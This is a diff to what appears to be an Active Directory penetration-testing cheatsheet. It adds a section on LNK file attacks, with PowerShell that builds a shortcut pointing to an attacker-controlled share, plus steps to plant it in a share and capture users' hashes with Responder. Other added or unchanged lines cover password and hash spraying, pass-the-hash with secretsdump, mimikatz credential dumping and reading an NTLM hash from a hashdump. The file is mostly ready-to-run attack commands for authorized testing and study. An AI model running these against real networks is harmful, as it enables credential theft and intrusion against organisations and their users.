@@ -243,7 +243,7 @@ crackmapexec smb 10.10.10.0/24 -d test.local -u fcastle -p Password1
 
 ### 2. Spray hashes(if we have them) instead of passwords
 ```sh
-crackmapexec smb 10.10.10.0/24 -d test.local -u administrator -H [HASH]
+crackmapexec smb 10.10.10.0/24 -d test.local -u administrator -H [NTLM-hash]
 ```
 ---
 
@@ -287,7 +287,7 @@ secretsdump.py test.local\fcastle:Password1@<TARGET_IP>
 ```
 ### Pass the Hash using secretsdump.py
 ```sh
-secretsdump.py administrator@<TARGET_IP> --hashes [NT-HASH]
+secretsdump.py administrator@<TARGET_IP> --hashes [NTLM-hash]
 ```
 ### Pass the Password using Metasploit
 ```sh
@@ -388,13 +388,13 @@ Invoke-ShareFinder # Locates shared network resources.
 ## Credential Dumping
 
 ### Dumping Hashes from LSASS
-Your compromised machine most likely dont have `mimikatz.exe` installed because it's not normal for users to have malware in their machine right? Let's try uploading mimikatz to the machine we compromised.
+Our compromised machine most likely dont have `mimikatz.exe` installed because it's not normal for users to have malware in their machine right? Let's try uploading mimikatz to the machine we compromised.
 
-If we havent get `mimikatz` in your Attacker machine yet, we can try going to `@gentilkiwi` mimikatz repository, or we can copy the following link
+If you havent had `mimikatz` in your Attacker machine yet, we can try going to `@gentilkiwi` mimikatz repository, or we can copy the following link
 ```sh
 https://github.com/gentilkiwi/mimikatz
 ```
-After going to the repo, go to releases and download any compressed file to your liking, in this case we'll be using a `.zip` instead. So click on the file `mimikatz_trunk.zip` and extract it to a directory
+After going to the repo, go to releases and download any compressed file to your liking, in this case we'll be using a `.zip` instead. So click on the file `mimikatz_trunk.zip` and extract it to a directory called `mimikatz_trunk`
 
 ```sh
 unzip mimikatz_trunk.zip -d mimikatz_trunk
@@ -529,6 +529,30 @@ xfreerdp /u:administrator /p:Password1 /d:test.local /v:<TARGET_IP>
 
 ---
 
+## LNK FILE ATTACKS
+
+### Creating LNK files through Powershell
+```ps1
+$objShell = New-Object -ComObject WScript.shell
+$lnk = $objShell.CreateShortcut("C:\test.lnk")
+$lnk.TargetPath = "\\<ATTACKER_IP>\@test.png"
+$lnk.WindowsStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Test"
+$lnk.HotKey = "Ctrl+Alt+T"
+$lnk.Save()
+```
+After creating the file, put the file into any share that we think would have the highest chance of being accessed, afterwards we just need to start-up responder and wait for domain users to start interacting with the malicious file!
+```sh
+sudo responder -I tun0 -dP
+```
+
+### Creating a LNK file through netexec
+```sh
+netexec smb <TARGET_IP> -d test.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=<ATTACKER_IP>
+```
+---
+
 ## Lateral Movement
 
 ### Using Pass-the-Ticket with Mimikatz on the compromised machine
@@ -623,15 +647,31 @@ loot
 ```
 ---
 ## References
+
 https://blog.syselement.com/ine/courses/ejpt/ejpt-cheatsheet
+
 https://www.offsec.com/metasploit-unleashed/fun-incognito/
+
+https://www.offsec.com/metasploit-unleashed/meterpreter-basics/
+
 https://github.com/GhostPack/Rubeus/
+
 https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
 
-
 ## Final Notes
+- **Multitask and dont just wait for scans to finish**
 - **Always verify attack prerequisites** (e.g., SMB signing, LLMNR/NBT-NS status)
 - **Check for privilege escalation paths** in BloodHound
 - **Monitor logs for detection & evasion techniques**
+
+- **`[NTLM-hash]` is taken from the 4th part of a hashdump E.G:**
+```sh
+Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
+```
+
+So from the Hashdump above we will be using:
+```sh
+1891f4775f676d4d10c09c1225a5c0a3
+```
 
 **Stay Ethical and Hope you enjoyed this simple cheatsheet!**
